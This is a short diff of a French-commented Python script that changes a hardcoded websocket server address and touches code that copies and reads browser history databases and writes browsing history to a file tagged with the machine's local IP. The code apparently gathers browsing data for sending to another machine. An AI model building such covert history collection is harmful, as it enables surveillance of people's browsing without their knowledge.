@@ -18,7 +18,7 @@ from threading import Thread
 import base64
 
 
-SERVER_URL = "ws://192.168.10.131:9000"
+SERVER_URL = "ws://192.168.43.226:9000"
 
 # Fonction pour récupérer l'adresse IP locale de la machine de manière plus robuste
 def get_local_ip():
@@ -196,6 +196,11 @@ async def _read_history_from_sqlite(db_path, browser_name, history_entries_list)
                 print(f"Fichier temporaire nettoyé : {temp_db_path}")
             except PermissionError as e:
                 print(f"ATTENTION: Impossible de supprimer le fichier temporaire {temp_db_path}. Il est peut-être encore utilisé: {e}")
+
+
+
+
+
 
 async def write_history_to_file(history_data, filename="browser_history_{local_ip}.txt"):
     """
